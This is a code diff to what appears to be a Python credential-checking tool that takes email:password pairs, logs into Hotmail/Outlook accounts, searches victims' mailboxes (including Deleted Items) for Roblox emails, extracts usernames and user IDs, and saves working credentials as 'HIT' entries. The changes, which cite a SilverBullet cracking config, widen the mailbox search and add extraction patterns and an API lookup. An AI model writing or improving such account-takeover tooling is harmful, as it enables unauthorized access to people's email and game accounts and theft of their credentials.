@@ -278,12 +278,13 @@ def extract_tiktok_username(search_text):
 
 # --- Roblox Full Capture Logic ---
 def extract_roblox_username(search_text):
-    # Roblox email patterns
+    # Roblox email patterns from SilverBullet config and common ones
     patterns = [
-        r'Hi ([a-zA-Z0-9_\.]{3,20}),',
-        r'Hello ([a-zA-Z0-9_\.]{3,20}),',
-        r'Your Roblox username is: ([a-zA-Z0-9_\.]{3,20})',
-        r'username: ([a-zA-Z0-9_\.]{3,20})',
+        r'account: ([\w\d_\.]{3,20})\.',
+        r'Hi ([\w\d_\.]{3,20}),',
+        r'Hello ([\w\d_\.]{3,20}),',
+        r'Your Roblox username is: ([\w\d_\.]{3,20})',
+        r'username: ([\w\d_\.]{3,20})',
     ]
     for pattern in patterns:
         match = re.search(pattern, search_text)
@@ -291,7 +292,29 @@ def extract_roblox_username(search_text):
             return match.group(1)
     return None
 
+def get_roblox_id_omni(username):
+    try:
+        # Using Omni-search API as seen in SilverBullet config
+        url = f"https://apis.roblox.com/search-api/omni-search?verticalType=user&searchQuery={username}&pageToken=&globalSessionId={uuid.uuid4()}&sessionId={uuid.uuid4()}"
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("searchResults"):
+                for result in data["searchResults"]:
+                    if result.get("contents"):
+                        for content in result["contents"]:
+                            if content.get("contentType") == "User":
+                                # Verification check if needed, but usually the first result is the most relevant
+                                return content.get("contentId")
+    except: pass
+    return None
+
 def get_roblox_id(username):
+    # Try Omni-search first
+    id_omni = get_roblox_id_omni(username)
+    if id_omni: return id_omni
+    
+    # Fallback to standard user search
     try:
         url = f"https://users.roblox.com/v1/users/search?keyword={username}&limit=10"
         r = requests.get(url, timeout=10)
@@ -477,15 +500,15 @@ def check_roblox_full(email, password, session_id):
         token = ms_res["token"]
         cid = ms_res["cid"]
         
-        # Step 2: Search Roblox Emails to get username
+        # Step 2: Search Roblox Emails to get username (Targeting no-reply@roblox.com)
         search_url = "https://outlook.live.com/search/api/v2/query"
         headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
         payload = {
             "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
             "EntityRequests": [{
                 "EntityType": "Conversation", "ContentSources": ["Exchange"],
-                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
-                "From": 0, "Query": {"QueryString": "from:roblox.com OR roblox"}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
+                "From": 0, "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 10, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
             }]
         }
         r = requests.post(search_url, json=payload, headers=headers, timeout=10)
@@ -517,7 +540,7 @@ def check_roblox_full(email, password, session_id):
                     f.write(f"{email}:{password}\n")
             return "HIT"
         else:
-            # Hotmail HIT but no Roblox found
+            # Hotmail HIT but no Roblox found in search results
             all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
             with lock:
                 with open(all_hits_path, 'a', encoding='utf-8') as f:
